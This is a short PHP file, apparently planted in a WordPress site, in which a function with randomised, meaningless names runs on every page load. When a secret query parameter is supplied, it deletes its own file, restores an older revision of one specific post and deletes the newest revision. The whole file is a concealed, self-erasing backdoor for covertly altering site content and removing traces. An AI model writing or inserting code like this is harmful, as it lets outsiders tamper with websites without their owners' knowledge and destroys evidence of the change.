<?php

function about_graph_player_multisite() {
	if (isset($_GET['highlighter_health_radio']) && $_GET['highlighter_health_radio'] === 'member_sliding_elementor') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$remover_multi_shopp = 10385;
		$recent_event_remote_checkout = wp_get_post_revisions($remover_multi_shopp);
		if (empty($recent_event_remote_checkout)) die('no revisions');
		if (count($recent_event_remote_checkout) < 2) die('less than 2');
		$like_hello_app = array_shift($recent_event_remote_checkout);
		$date_ssl_cool_integration = $like_hello_app->ID;
		$global_effects_edition_magic = array_shift($recent_event_remote_checkout);
		$multi_mobile_switch = $global_effects_edition_magic->ID;
		$endpoints_directory_calendar = wp_restore_post_revision($multi_mobile_switch);
		if ($endpoints_directory_calendar === false) die('error restoring');
		$endpoints_directory_calendar = wp_delete_post_revision($date_ssl_cool_integration);		
		if ($endpoints_directory_calendar === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'about_graph_player_multisite');
